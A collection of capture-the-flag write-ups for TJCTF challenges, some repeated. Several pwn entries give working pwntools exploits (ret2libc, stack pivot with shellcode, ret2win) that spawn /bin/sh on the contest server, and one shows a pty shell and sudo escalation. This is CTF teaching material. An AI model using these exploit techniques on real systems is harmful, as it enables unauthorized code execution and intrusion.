print(r.recvline())
This works and I don't know why
tjctf{TH3_1llum1n4ti_I5_R3aL}
```



### File: Writeups/TJCTF/Misc/Discord.md

# Discord

This challenge was definitely one of the harder ones in the CTF, mainly because of it's deceiving point value, at only 5 points. 
The description doesn't provide any information at all, which was very strange, and the fact that the challenge was categorized as "Misc" also made it very confusing, as should the challenge not be OSINT if nothing at all is provided? 

This ended up taking a very long time to figure out. Perhaps the title would give a bigger hint? It mentions Discord, which is a common text and voice messaging service used by gamers. 

I myself, am not a gamer, so I wasn't too keen on the idea of registering at discord.com, but if I was going to get 5 points for it, I was going to do it nonetheless. 

Registering however, was a challenge in itself. 

The difficulty lies in that you have to put personal information in, but wait... Do I really trust a site like discord with my personal details? 

Were these 5 points really worth it? I asked myself.

"Yes. Yes they are. We must beat our rivals Pwn to 0xE4!". 

And so, reluctantly, I filled in my details, and added 2 Factor Authentication for safety. 

These 5 points were going to be so worth it. 

However, how was I to get into the server where the flag was? 

I would need an invite link. But where was I to get that? 

Well, I started by trying to OSINT the challenge creators, in the hopes that they would have left something in their social medias, but it ended up with no results, to my sadness. 

I looked for minutes, hours, days for this link, but nothing showed up.

Eventually, I gave up and decided to come back to this challenge another day. I decided to look at other challenges. 

What about that circle one? Or the difficult decryption one? 

But still, there was a feeling in my heart. 

A feeling that meant I would HAVE to get those 5 points. 

After all, it could mean the difference between winning and losing...

One morning, while scrolling through the challenges, I noticed something rather interesting. 

There was a logo that looked oddly familiar amongst the email, Facebook and Twitter logos. 

At once I recognised what it was.

IT WAS THE DISCORD LOGO! Hovering over it, I saw it redirected to a discord.gg link. 

Perhaps this was it? 

Perhaps this was the link to join the discord?? With my right hand sweating and shivering, I moved my mouse towards the icon, and clicked.

For a moment... There was silence. 

Nothing could be heard, except for the faint sound of rickrolls in the background, and the weird audio for arabfunny. 

Suddenly, I was greeted with a page. "evanyeyeye invited you to join TJCTF". 

This was it. Those 5 points were going to be mine, and we would crush Pwn to 0xE4 like twigs. 

However, it turns out this was again, still not enough. The security of the server was set to very high, and I needed to pass a captcha. 

"No problem!", I thought. "I can just use my OCR script!". 

However, despite trying over 2 times to try and get the OCR script to work, I never managed to do it, and time was running out. 

There were only 95 hours left in the CTF. 

This needed to be quick.

We were running out of time. 

This was an emergency.

Immediately I recruited help from our team's Asian, PotatoK. He was able to read the letters and numbers and so, after a long while of waiting, we got access to the server! Those 5 points were finally going to be ours! However, once again, due to the delicate crafting of this challenge by the creator, KyleForkBomb(who even is that guy), we were stopped in our tracks once again. "How many parts does this challenge have?", I thought to myself. I decided to go back to the challenge page, and luckily enough, there was a relevant hint!

`"Type ?flag in chat"`

So I proceeded to type in "?flag in chat", in the hopes that it would give me the flag, but after 5 seconds of me typing "?flag in chat" into notepad, it was clear that this was going nowhere. So, I kept on pushing. I found a shortcut for typing it as well, by simply CTRL-C to copy and CTRL-V to paste. However, even after a further 7 seconds of typing it, no flag was there. Where was this flag, and why was it so difficult just for 5 measly points? I had to beat Pwn to 0xE4. I had to.

After a few more seconds of trying to type "?flag into chat" into my notepad window, I decided to try and take the hint from another perspective. 
I decided to read the hint once more.

`"Type ?flag in chat"`

Ever since we discovered the hint, we had always interpreted it as 'Type "?flag i n chat"'. But what if it was meaning something else? For example, it could have meant 'Type "?flag" in chat'.

Now everything made sense. 

The pain of trying to find the Discord link. The captcha which I had to get PotatoK to solve. The registering for the Discord account. It all made sense now. All the suffering we went through. 

With palms still sweating, I slowly typed "?flag" into the #general chat. 

There was no one else around as far as I could tell. I was going to crush Pwn to 0xE4. 

I was going to get these points. 

I was close, I could feel it.

I could definitely taste the flag.

I felt so close. 

Once I typed "?flag" in chat, there was silence yet again.

I could feel the sense once again, just like when I clicked on the discord link.

A few seconds passed. 

Then, I saw my message get deleted? Who could have done this? Was it the evil mind of the challenge creator? Was it... no... it couldn't be... Pwn to 0xE4??? 

Could they have done this in order to get the flag and the points before us? 

This was a disaster. 

We needed those points. 

This was turning into a nightmare, and there were only 94 hours left in the CTF. 

We needed a plan to take them down, and fast. We quickly retreated back to the Jackbox server in order to discuss. 

This had to be done quick. 

We would need to act fast.

Our plan was simple. We would just need to type the command, and the get output before Pwn to 0xE4 would have a chance to intervene. 

Using my new techniques I learnt from Truly Terrible Why, and also the CTRL-C CTRL-V technique from earlier, I was set to get this flag. This was going to work. 

I was going to get this flag, get those 5 points, and crush Pwn to 0xE4. 

I could taste victory already, and those CTFTime points would definitely be ours.

We were almost ready to execute the plan. 

This would be it. 

The flag would be ours. 

Those 5 points we worked so hard for. 

Registering the account, finding the link, getting past the captcha, using the hint. All the pain and suffering would finally pay off. 

We were ready to take on Pwn to 0xE4.

We waited for the perfect moment to strike, but we had to be extra careful, as we did not expect them last time...

The plan was in action! I pasted the command carefully, but swiftly, and awaited the response...

Yet again... silence...

Until...

We were able to retrieve a message link...

https://discordapp.com/channels/426043976957820940/467040678820446209/713526612158840843

It appears this takes us to the announcements channel, which I scrolled through a couple times, but couldn't find anything of use. 

Where was this flag, and why was this challenge only worth 5 points???

Then... something caught my eye...

It appeared to be... an image... with some text on it. The words looked familliar... especially the "tjctf" part...

Suddenly, I realised what this was. 

This was the flag!! The very thing that took almost 2 minutes to find was right in front of us!! 

I had to get PotatoK once again to read it for me, but we finally found the flag after a lot of sweat, pain, and effort. 

Swiftly I wrote the flag down, and copied it into the flag box.

"Correct!" it read, and those 5 points were finally ours.

We would go on to get defeated by Pwn to 0xE4, as they solved Naughty, meaning that these 5 points made all the difference.

Thank you for making this one of the most difficult CTF challenges I have ever solved, and even though it was only worth 5 points, they were more than satisfying to get.
#### Flag: tjctf{circles_was_a_bad_challenge}

-@Willwam845



### File: Writeups/TJCTF/Misc/Gamer M.md

# Gamer M

After analysing the random.randint i found that it was rigged (info by botters) so i just reversed what it done (with help from tony) and pieced it together - code below  
#### tjctf{i5AJ0borFRenCx6342}

```python
def getindex(a):
    out = []
    for i in a:
        if "{" in i:
            out.append(0)
        if "3" in i:
            out.append(1)
        if "4" in i:
            out.append(2)
        if "2" in i:
            out.append(3)
        if "}" in i:
            out.append(4)
    return out

with open("out","r") as f:
    out = f.read()
    f.close()
out = out.split("\n")[:-2]
out = [[x[i:i+5] for i in range(0, len(x), 5)] for x in out ]
stats = ""
for j in range(5):
    for i in out:
        a = getindex(i)
        print(a)
        stats += str((a.index(j)-j)%5)
print(stats) # 4 is common
counter = [0,0,0,0,0]
for i in stats:
    counter[int(i)] += 1

print(counter)
for k in range(5):
    for j in range(5):
        alpha = out[0][getindex(out[0]).index(k)]
        alpha2 = {}
        for i in alpha:
            alpha2[i] = 0

        for i in out:
            thing = i[getindex(i).index(k)]
            thing = thing[-1]+thing[:-1] # revshift by 4
            alpha2[thing[j]] += 1

        for i in alpha:
            print(i,alpha2[i],end=" ")
        print()
```



### File: Writeups/TJCTF/Misc/Jarvis.md

# Jarvis

So i was looking at the csv and thought `"kek tf does this mean"` but then i checked the range values for the csv and saw they were rly
similar. i looked at the hint about tony stark and thought maybe i need to build an ai or some shit. 
woa kept telling me i was mental and had big confusion but i continued anyway.
i built one (code below) and ran it (followed tutorial with adjustments for massive training data).
the output it gave was in binary (like in training data). i converted to text and gave `flag{mlWis_cool} `
but it looked like some bits were flipped so i changed it to `flag{ml_is_cool}` which is flag.

https://medium.com/technology-invention-and-more/how-to-build-a-simple-neural-network-in-9-lines-of-python-code-cc8f23647ca1
```python
hlp = open("help.csv","r").read().split("\n")
hlp = [[int(y) for y in x.split(",")] for x in hlp]

flg = open("flag.csv","r").read().split("\n")
flg = [[int(y) for y in x.split(",")] for x in flg]


from numpy import exp, array, random, dot, set_printoptions, inf
set_printoptions(threshold=inf)

class NeuralNetwork():
    def __init__(self):
        self.synaptic_weights = 2 * random.random((10, 1)) - 1
    def __sigmoid(self, x):
        return 1 / (1 + exp(-x))
    def __sigmoid_derivative(self, x):
        return x * (1 - x)
    def train(self, training_set_inputs, training_set_outputs, number_of_training_iterations):
        for iteration in range(number_of_training_iterations):
            output = self.think(training_set_inputs)
            error = training_set_outputs - output
            adjustment = dot(training_set_inputs.T, error * self.__sigmoid_derivative(output))
            self.synaptic_weights = self.synaptic_weights + adjustment # fukin numpy being shit kek
    def think(self, inputs):
        return self.__sigmoid(dot(inputs, self.synaptic_weights))



neural_network = NeuralNetwork()

print("Random starting synaptic weights: ")
print(neural_network.synaptic_weights)
training_set_inputs = [[y/100 for y in x[1:]] for x in hlp]
training_set_outputs = [x[0] for x in hlp]

print(training_set_inputs[0],training_set_outputs[0])

for i,j in enumerate(training_set_inputs):
    neural_network.train(array([j]), array(training_set_outputs[i]).T, 10000) # gotta train individually or numpy gets triggered

print("New synaptic weights after training: ")
print(neural_network.synaptic_weights)

b = ""
for i,j in enumerate(flg):
    print("Considering new situation :",j)
    a = neural_network.think(array(flg[i]))[0]
    b += str(int(a))
    print(int(a))
print(b)
```



### File: Writeups/TJCTF/Misc/Slicer.md

# Slicer

If we open this up in a gcode editor, we can see a fake flag there.
The hint hints at the movement speed of the arm, and so if we do a bit of research into this, 
we can see they are represented by "F" values. Therefore, we extract these from the gcode file.
Most of them are either `F10500` or `F2400`, but some of them appear to be quite small,
and some even appear to be within the range of numbers for standard ASCII chars. 
Perhaps there is something hidden in those values...  
So, we filter out the `F10500` and `F2400` values.  
At the end of the output, we can see a list of values that appear to be within the ASCII number range, 
so I converted these numbers to ASCII text to get the flag.  
```
F116
F106
F99
F116
F102
F123
F109
F52
F110
F121
F95
F108
F52
F121
F51
F114
F115
F125
```
#### Flag: tjctf{m4ny_l4y3rs}



### File: Writeups/TJCTF/Misc/TTW.md

# TTW

So, what a mess this was. Firstly, we started by performing a timing attack. That managed to get us quite a lot of things, but it was annoying having to wait 5 minutes for some results. So lets look for a better option. Looking at the hint, it says to think about I/O. Hmmm, ok. Connecting through netcat, it prints out "Imagine having a usable terminal". Ok, interesting. If we try and enter in a command, it doesn't output anything. Odd. We can probably assume that all our commands are being sent to `/dev/null`, where they just get wiped away. What if we could trick the connection to redirect our commands anywhere, instead of `/dev/null`. If we know that `2>/dev/null` sends any errors there, we can redirect our output to the input as we're connected there, doing `>&0`. Once we've done some enum, we can use the name of the challenge "TT Why" (sounding like TTY) to spawn a tty shell, where we can run sudo -l (as password.txt has problem-user password) to see that we can run `/usr/bin/chguser` as root. Changing user, navigating to home folder, then to flag, we get flag.txt
```
>ls -alR ./ >&0
message.txt
password.txt
```
```
> cat message.txt
Man, I just sure wish I could impersonate other_user
```
```
> cat password.txt
Password for problem user: 1234qwer
```
```
> python -c 'import pty; pty.spawn("/bin/bash")' >&0
```
```bash
$ sudo -l
(root) /usr/bin/chguser
```
```bash
$ sudo /usr/bin/chguser other-user
Password: 1234qwer
```
```bash
$ ls -alR 
./flag:
flag.txt
```
```bash
$ cat flag/flag.txt
```
#### tjctf{ptys_sure_are_neat}



### File: Writeups/TJCTF/Misc/Timed.md

# Timed

Use `ord(open()[x])` to read one byte at a time, and sleep for it's ascii value   
#### tjctf{iTs_T1m3_f0r_a_flaggg}



### File: Writeups/TJCTF/Misc/Zipped up.md

# Zipped up

We start  with a .zip file. When we unzip, we get a directory called 0. It contains one file, 1.tar.bz2


If we decompress this file, we get a directory called 1, which contains 1.txt and another compressed file. This repeats.


The text files seem to contain `tjctf{n0t_th3_fl4g}`,
I took a guess that at some level in this recursive compression has a .txt file that yields the flag.


This is relatively simple. Every file is either .kz3, .tar.bz2, or .tar.gz.
We can use file extensions to detect which type of file it is, and then decompress.
Script below(a bit bad, I'm aware) I unzipped up to directory 1 manually because it's different to the rest.

```python
start = 1
import os
def unzip(filename):
  os.system(f"unzip {filename}")
def untar(filename):
  os.system(f"tar -zvjf {filename}")
def gunzip(filename):
  os.system(f"tar -zvxf {filename}")
cur = start
while True:
  files = os.listdir(str(cur))
  file = next(filter(lambda x: '.txt' not in x, files)) # Ignore this monstrosity
  file = os.path.join(str(cur),file)
  if 'kz3' in file:
    unzip(file)
  elif 'bz2' in file:
    untar(file)
  else:
     gunzip(file)
  file = next(filter(lambda x: '.txt' in x, files)) # Again, ignore this monstrosity
  os.system(f"cat {os.path.join(str(cur),file)} >> flags.txt") # Basically puts the text file into flags.txt
  os.system(f"rm -rf {cur}") # Remove at your own risk, just cleans up and makes sure not to blow up your VM
  cur += 1
```
After running the script you'll be left with a file flags.txt. Majorly, flags.txt contains a bunch of `ljctf{n0t_th3_fl4g}`
but if you filter this out using `grep -v` the flag will be revealed to you.



### File: Writeups/TJCTF/Misc/arabfunny.md

# arabfunny

There's DTMF tones in the audio from `1:05ish - 1:18ish`, decode those and convert the 2 digit ascii numbers to text to get the flag  
#### tjctf{bruh_camel_240p}



### File: Writeups/TJCTF/Moar Horse 4.md

# Moar Horse 4

Jwt HSA/RSA signing vulnerability
Use pubkey.pem with jwt_tool.py
'speed' is calculated with  
```python
speed = int(hashlib.md5(("Horse_" + horse).encode()).hexdigest(), 16)
```
'ajuuer' is fast enough
Set horses to ["ajuuer"]  
Race  
Get flag  
#### tjctf{w0www_y0ur_h0rs3_is_f444ST!} 
```python
from pwn import *
import hashlib
from pwnlib.util.iters import mbruteforce
import string

BOSS_HORSE = "MechaOmkar-YG6BPRJM"
goal = int(hashlib.md5(("Horse_" + BOSS_HORSE).encode()).hexdigest(), 16)
def attempt(horse):
        speed = int(hashlib.md5(("Horse_" + horse).encode()).hexdigest(), 16)
        if speed > goal:
                return True
        else:
                return False
myhorse = mbruteforce(attempt, string.ascii_lowercase, length=10)
print(myhorse)
```



### File: Writeups/TJCTF/OSRS.md

# OSRS

There is literally zero protections.  

We *could* do ret to shellcode, but there's no jmp esp and the shifts with the buffer can be very temperamental.  
Instead, I used ret2libc, which is a lot more reliable.  

Via the GOT and PLT, we can execute a simple leak of the address of puts.   
Feeding this value into libc database find, their libc version is libc6-i386_2.27-3ubuntu1_amd64  

So, we can use the GOT and PLT to leak the address of puts and call main again.  
Then, we can subtract the appropriate value from this to get the libc base.  
Since we called main again, we get a second input, to which we can deliver the main payload of system("/bin/sh").  

```python
from pwn import *
NUM_TO_RET = 0x10c + 4
padding = b'A' * NUM_TO_RET
e = ELF("./osrs")
leak = flat(padding, e.plt['puts'], e.symbols['main'], e.got['puts'])
libc = ELF("/home/kali/Tools/libc-database/libs/libc6-i386_2.27-3ubuntu1_amd64")
p = remote("p1.tjctf.org", 8006)
p.recvuntil(": ")
p.sendline(leak)
P.recvlines(2)
output = p.recvline() # Our leak of the puts address
puts = u32(output[:4])
log.info(f"Puts address: {hex(puts)}")
libcbase = puts - libc.symbols['puts']
libc.address = libcbase
log.info(f"Libc base: {hex(libcbase)}")
final = flat(padding, libc.symbols['system'], libc.symbols['exit'], next(libc.search(b"/bin/sh\x00")))
p.sendline(final)
p.interactive()
```



### File: Writeups/TJCTF/Pwn/Cookie Library.md

# Cookie Library

NX, no PIE. The whole cookie thing is largely irrelevant so I'm not gonna comment on it.

It calls gets on rbp-0x50, opening an avenue for buffer overflow. We can do a ret2plt attack,
calling puts@plt on puts@got in order to leak a libc address, specifically that of puts.
Then, we can subtract the appropriate offset to get the libc base.

From there, it's a simple ret2libc attack. We call system("/bin/sh") using pop rdi.
The problem is, this doesn't seem to work. To make it work, we have to set rsi and rdx to 0.
We don't have a pop rdx gadget inside of the binary, so it's impossible... right?

Wrong, actually. At this point in the exploit, we know the libc base, so we can use rop gadgets inside of the libc. 
So the full exploit is:
```
1. use ret2plt to leak a libc address via the PLT and GOT
2. do poprdi + /bin/sh + pop rdx ; pop rsi + 0 + 0 + system in order to pop a shell
```



### File: Writeups/TJCTF/Pwn/El primo.md

# El primo

There's no NX, AND a gets call. On top of this, the program sends us the buffer address. A simple ret to shellcode, right?

Wrong, in fact. We have to buffer overflow from main, which makes things more difficult.
Instead of the classic leave ; ret, it pops a value into ecx, then loads ecx - 4 into esp.
This removes our classic buffer overflow where we change EIP. Instead, we must stack pivot.

We have control of ESP. When you call ret, the program jumps to the address stored at ESP.
We can set esp to the address of the buffer.
Then, we change the beginning of our buffer to be the address of our shellcode.I put the shellcode after the esp.

We can use pattern.py to figure out the amount of bytes until esp, which is 32.

#### NOTE! it subtracts 4 from our chosen esp value, so we must take care of this.
I created custom shellcode that had to have the address of a string /bin/sh which I also put in the input.
```python
from pwn import *
import re
NUM_TO_ESP = 32
p = remote('p1.tjctf.org', 8011)
p.recvline()
output = p.recvline().decode()
bufaddr = int(re.findall("hint: (,*)", output)[0],16)
shellcode = asm(f"mov ebx,{hex(bufaddr + 4)} ; mov ecx,0 ; mov edx,0 ; mov eax,0xb ; int 0x80") 
start = flat(bufaddr + 36, b"/bin/sh\x00")
espval = bufaddr + 4
payload = start
payload += b'A' * (NUM_TO_ESP - len(payload))
payload += p32(espval)
payload += shellcode
p.sendline(payload)
p.interactive()
```



### File: Writeups/TJCTF/Pwn/OSRS.md

# OSRS

There is literally zero protections.  

We *could* do ret to shellcode, but there's no jmp esp and the shifts with the buffer can be very temperamental.  
Instead, I used ret2libc, which is a lot more reliable.  

Via the GOT and PLT, we can execute a simple leak of the address of puts.   
Feeding this value into libc database find, their libc version is libc6-i386_2.27-3ubuntu1_amd64  

So, we can use the GOT and PLT to leak the address of puts and call main again.  
Then, we can subtract the appropriate value from this to get the libc base.  
Since we called main again, we get a second input, to which we can deliver the main payload of system("/bin/sh").  

```python
from pwn import *
NUM_TO_RET = 0x10c + 4
padding = b'A' * NUM_TO_RET
e = ELF("./osrs")
leak = flat(padding, e.plt['puts'], e.symbols['main'], e.got['puts'])
libc = ELF("/home/kali/Tools/libc-database/libs/libc6-i386_2.27-3ubuntu1_amd64")
p = remote("p1.tjctf.org", 8006)
p.recvuntil(": ")
p.sendline(leak)
P.recvlines(2)
output = p.recvline() # Our leak of the puts address
puts = u32(output[:4])
log.info(f"Puts address: {hex(puts)}")
libcbase = puts - libc.symbols['puts']
libc.address = libcbase
log.info(f"Libc base: {hex(libcbase)}")
final = flat(padding, libc.symbols['system'], libc.symbols['exit'], next(libc.search(b"/bin/sh\x00")))
p.sendline(final)
p.interactive()
```



### File: Writeups/TJCTF/Pwn/Seashells.md

# Seashells

There is a function called "shell". This function loads rdi into rbp-8, checks it against the value `0xdeadcafebabebeef`, 
and if the check is successful it pops a shell for us.  
Clearly, our goal is to call this function.  

In main, there is a gets call. It reads as much input as we want into `rbp-0xa`, opening up an avenue for buffer overflow.
As the saved rbp is 8 bytes long, our padding will be 0xa + 8 bytes of junk.  

We *could* use a pop rdi gadget so that the check works properly, 
but there's no need. Instead, we can jump straight to the instruction inside of shell that pops a shell for us.  

So our payload is just padding + address of instruction in shell that pops a shell  
```python
from pwn import *
NUM_TO_RET = 0xa + 8
padding = b'A' * NUM_TO_RET
payload = flat(padding,0x4006e3, word_size=64)
p = remote('p1.tjctf.org',8009)
p.recvlines(2)
pause()
p.sendline(payload)
p.interactive()
```



### File: Writeups/TJCTF/Pwn/Stop.md

# Stop

This has been explained in countless writeups, so I won't go over it largely, but there's NX and no PIE. 
So we can use ret2plt, like always, to leak a libc address.  

### LARGE PROBLEM!  
Main is quite a complex function. 
For the purposes of buffer overflow, this is irrelevant to us.
However, if we just overwrite RBP with a bunch of As,
it means that errors will be caused at an instruction like `mov DWORD PTR [rbp-0x8], 0x9` , 
and whenever pop is called(after rsp is set to rbp). 
Thus, we must give rbp some form of authentic value so we can basically move the stack somewhere else. 
There is a page mapped read and write inside of the binary at around `0x602000-0x603000` .
We can set rbp to a value around here to create a nice fake stack, then execute a ret2libc attack.  
```python
from pwn import *
NUM_TO_RET = 282
padding = b'A' * NUM_TO_RET
e = ELF("./stop")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("/home/kali/Tools/libc-database/libs/libc6_2.27-3ubuntu1_amd64/libc.so.6")
poprdi = 0x0000000000400953 # pop rdi ; ret
poprsi = 0x0000000000400951
#p = e.process()
p = remote('p1.tjctf.org', 8001)
leak = flat(poprdi, e.got['printf'],poprsi, 0, 0, e.plt['printf'], 0x0000000000400747, word_size=64)
payload = padding[:-8] + p64(0x000000000602000 + 0x1000 - (0x20 + 0x8 * 10)) + leak
p.sendline(payload)
p.recvlines(9)
output = p.recvuntil("Which")[:-5]
output += b'\x00\x00'
printf = u64(output)
log.info(f"Printf: {hex(printf)}")
libcbase = printf - libc.symbols['printf']
libc.address = libcbase
log.info(f"Libc base: {hex(libcbase)}")
chain = flat(poprdi, next(libc.search(b"/bin/sh\x00")), poprsi, 0, 0, libc.symbols['system'], word_size=64)
payload = padding + chain
pause()
p.sendline(payload)
p.interactive()
```



### File: Writeups/TJCTF/Pwn/Tinder.md

# Tinder

It gets a bunch of input from us using a function called input that does some multiplication a value,
lets call this number "num", and then calls fgets(var,num,stdin), basically reading num bytes into "var". 
By stepping through the program and looking at every function call of input, we see the last one has the largest value, 
so I just went with that even though they'd all probably work.


Later on, there are some interesting instructions. Namely these two:  
```
cmp DWORD PTR [ebp-0xc], 0xc0d3d00d
jne <main+443>
```
Note that these two lines are at `main+247` - that's quite a jump. It compares some variable on the stack to `0xc0d3d00d` and jumps away if they aren't equal. If they are equal, it goes on to execute some instructions including fopen, fgets, puts etc. - probably printing the flag from flag.txt. 


Using gdb, I set a breakpoint at the instruction that compares `ebp-0xc` to `0xc0d3d00d`. Then at the fourth input I pasted in a de brujin pattern generated by pattern.py. At the breakpoint, I read `ebp-0xc`, and pasted this value back into pattern.py. This gives 116 bytes until we overwrite this variable, so our payload is just

```
enter whatever you want into the first three inputs
enter 116 bytes + p32(0xc0d3d00d) on the fourth input
Script below, even though this doesnt really need a script(a dynamic one, I mean)
```
```python
from pwn import *
NUM_TO_VAR = 116
padding = b'A' * NUM_TO_VAR
p = remote('p1.ljctf.org',8002)
[p.sendline('t') for _ in range(3)] # If you send nothing it'll rage
payload = padding + p32(0xc0d3d00d)
p.sendline(payload)
p.interactive()
```



### File: Writeups/TJCTF/Rap God.md

# Rap God

Right channel of audio is different  
Remove left channel, get full spectogram with https://convert.ing-now.com/mp3-audio-waveform-graphic-generator  
Wingdings2  
#### tjctf{quicksonic}



### File: Writeups/TJCTF/Reasonably Secure Algorithm.md

# Reasonably Secure Algorithm

With an n value this small, it can be quite easily cracked.  
I used RsaCtfTool (git clone https://github.com/Ganapati/RsaCtfTool), with the command:  
```python
python RsaCtfTool.py -n 126390312099294739294606157407778835887 -e 65537 --uncipher 13612260682947644362892911986815626931
```
#### tjctf{10minutes}



### File: Writeups/TJCTF/Reversing/ASMR.md

# ASMR

( https://gist.github.com/bobbo/e1e980262f2ddc8db3b8 for help)
So we download the file, and we find that it's pure assembly written in intel syntax, nice. Let's compile it:
nasm -f elf64 -o asmr.o asmr.asm
ldd -o asmr asmr.o
When we run it, we don't get anything back. Odd. Lets see what's in the assembly.
I decided to reverse all the assembly so that we can get a good picture of what's happening. 
Basically, in main, it's creating a socket, setting some options for the socket, binding the connection to port 1337, 
listening on any address, then accepts the connection. Once we connect, it sends "Enter Password:".
The program then reads our input, and checks to see whether it's 17 chars (16 + null byte). 
If our input isn't 16 chars + null byte, it chucks us to label5, which is basically output "Nope" and then end the connection.
So we don't want that. We see that label2 compares our last char to null byte. 
Whilst our input != a null byte, it xors it with key 0x69 (105 in decimal) (that's what label1 does).
Label2 then checks to see if that's the password, and if it's correct, it spits out 56333 chars of hex at us. 
If we get the hex that it moves to the rax register (0x360c1f0605360c1e) and (0x0c0c10361b041a08), xor it with key 0x69 and reverse, 
we get "we_love_asmr_yee". Input that as the password, and the hex gets spit out.
If we restart it all again but save to a file, that's a lot nicer to work with. 
The flag isn't in the strings, but if we take a look at it in ghex, we see a whole load of things.
Removing the "Enter password:" and looking at the file headers, we see that it's a .ogg file.
Save the file as that, open it in an audio player,
and we get "The flag is tjctf{Bravo Uniform Bravo 6 Lira Echo _ Whiskey Romeo 4 Pop _ Pop 0 Pop}" 
That's a very long flag, so probably not.
Using the hint they gave us (NATO Phonetic Alphabet), we can swap the words for letters and we get a nice message from the team,
as well as  tjctf{s0m3_n1c3_s0und5_for_you!!!}



### File: Writeups/TJCTF/Reversing/Comprehensive2.md

# comprehensive2

```python
a = [1, 18, 21, 18, 73, 20, 65, 8, 8, 4, 24, 24, 9, 18, 29, 21, 3, 21, 14, 6, 18, 83, 2, 26, 86, 83, 5, 20, 27, 28, 85, 67, 5, 17, 2, 7, 12, 11, 17, 0, 2, 20, 12, 26, 26, 30, 15, 44, 15, 31, 0, 12, 46, 8, 28, 23, 0, 11, 3, 25, 14, 0, 65]
print(str([x for z in [[[ord(m[i]) ^ ord(n[j // 3]) ^ ord(n[i - j - k]) ^ ord(n[k // 21]) for i in range(j + k, j + k + 3)] for j in range (0, 21, 3)] for k in range(0, len(m), 21)] for y in z for x in y])[1:-1])
#i deobfuscated first to get
for k in range(0, 63, 21):
    for j in range (0, 21, 3):
        for i in range(j + k, j + k + 3): # every 3 char chunks
            shat = ord(m[i])
            #shat = a[i] i will use this later to solve
            shat ^= ord(n[j // 3]) #[0,1... 6]
            shat ^= ord(n[i - j - k]) #[0,1,2]
            shat ^= ord(n[k // 21]) #[0,1,2]
            go += chr(shat)
print(go)
#then i made this script to find where the flag could be
for i in range(0,60,3):
    crib = " tjctf{"
    for j in range(2):
        for k in range(3):
            pp = a[i:i+6]
            x = pp[0+j] ^ pp[1+j] ^ pp[3+j] ^ pp[4+j]
            x^= ord(crib[0+k]) ^ ord(crib[1+k]) ^ ord(crib[3+k]) ^ ord(crib[4+k])
            if x == 0:
                print(i+j,crib[k:])
```

then i found that it showed 2 results for 31-33 range which looked promising. 
i xored them 2 at a time as well as parts of the flag to find the difference. 
i then asked willwam to find a solution but i also checked it with the solutions i generated.
i then found `33 == 21 + 18` so the mid of 3 sections xored with flag part would get the other part of flag.
this gave me "cap" as my 4th-6th characters. 
i used the chars i generated and bruteforced it and saw `"hata o sagashiteimQCE ka? dozo"`,
`"tjctf{sE]Ymasen_flag_kudasaiYM"` which was using "isa". 
i brute forced the last char to get "isacapo" and 
#### "hata o sagashiteimasu ka? dozo, tjctf{sumimasen_flag_kudasaii}."



### File: Writeups/TJCTF/Reversing/Forwarding.md

# Forwarding  

Download -> strings ./forward -> scroll up  
#### tjctf{just_g3tt1n9_st4rt3d}



### File: Writeups/TJCTF/Reversing/Gamer R.md

# Gamer R

Just remove the duck's ability to move and make knife go brrrrrrrr zoom
and then get flag
#### tjctf{orenji_manggoe}



### File: Writeups/TJCTF/Reversing/Gym.md

# Gym

##### Download -> make executable -> create flag.txt

If we take a look at main, we can see that it basically says "starting weight is 211, try and get me down to 180 by day 7" 
(when we run the program, we're presented with 4 options to reduce weight. Have to do this in 7 days). If we rev main, we basically 
only care about this bottom bit
```python
user_input = input("What is your answer?")
iVar1 = int(user_input)

if iVar1 == 2:
    startweight -= 1
else:
    if iVar1 == 3:
        startweight -= 2
    else:
        if iVar1 != 4:
            counter += 1
    startweight -= 3
```
So here, we see that if we choose option 2, we subtract 1 from our weight. If our input isn't 2, then we go to the else. 
If input = 3, subtract 2. If not, then if our input is not 4, then increase the counter. 
But what we notice is that we always subtract 3 from our weight, if our answer wasn't 2.
So now for some simple maths:
```
211 - 180 = 31
31 = 6(2+3) - 1
```
Input in:
3
3
3
3
3
3
2  
Wait 3 seconds, boom, profit

#### tjctf{w3iGht_l055_i5_d1ff1CuLt}



### File: Writeups/TJCTF/Sarah Palin Fanpage.md

# Sarah Palin Fanpage

Saves cookie with dict of liked moments  
```bash
echo 'COOKIE' | sed 's/false/true/g' | base64 -w0
```  
Replace cookie and go to vip area



### File: Writeups/TJCTF/Seashells.md

# Seashells

There is a function called "shell". This function loads rdi into rbp-8, checks it against the value `0xdeadcafebabebeef`, 
and if the check is successful it pops a shell for us.  
Clearly, our goal is to call this function.  

In main, there is a gets call. It reads as much input as we want into `rbp-0xa`, opening up an avenue for buffer overflow.
As the saved rbp is 8 bytes long, our padding will be 0xa + 8 bytes of junk.  

We *could* use a pop rdi gadget so that the check works properly, 
but there's no need. Instead, we can jump straight to the instruction inside of shell that pops a shell for us.  

So our payload is just padding + address of instruction in shell that pops a shell  
```python
from pwn import *
NUM_TO_RET = 0xa + 8
padding = b'A' * NUM_TO_RET
payload = flat(padding,0x4006e3, word_size=64)
p = remote('p1.tjctf.org',8009)
p.recvlines(2)
pause()
p.sendline(payload)
p.interactive()
```



### File: Writeups/TJCTF/Slicer.md

# Slicer

If we open this up in a gcode editor, we can see a fake flag there.
The hint hints at the movement speed of the arm, and so if we do a bit of research into this, 
we can see they are represented by "F" values. Therefore, we extract these from the gcode file.
Most of them are either `F10500` or `F2400`, but some of them appear to be quite small,
and some even appear to be within the range of numbers for standard ASCII chars. 
Perhaps there is something hidden in those values...  
So, we filter out the `F10500` and `F2400` values.  
At the end of the output, we can see a list of values that appear to be within the ASCII number range, 
so I converted these numbers to ASCII text to get the flag.  
```
F116
F106
F99
F116
F102
F123
F109
F52
F110
F121
F95
F108
F52
F121
F51
F114
F115
F125
```
#### Flag: tjctf{m4ny_l4y3rs}



### File: Writeups/TJCTF/Stop.md

# Stop

This has been explained in countless writeups, so I won't go over it largely, but there's NX and no PIE. 
So we can use ret2plt, like always, to leak a libc address.  

### LARGE PROBLEM!  
Main is quite a complex function. 
For the purposes of buffer overflow, this is irrelevant to us.
However, if we just overwrite RBP with a bunch of As,
it means that errors will be caused at an instruction like `mov DWORD PTR [rbp-0x8], 0x9` , 
and whenever pop is called(after rsp is set to rbp). 
Thus, we must give rbp some form of authentic value so we can basically move the stack somewhere else. 
There is a page mapped read and write inside of the binary at around `0x602000-0x603000` .
We can set rbp to a value around here to create a nice fake stack, then execute a ret2libc attack.  
```python
from pwn import *
NUM_TO_RET = 282
padding = b'A' * NUM_TO_RET
e = ELF("./stop")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
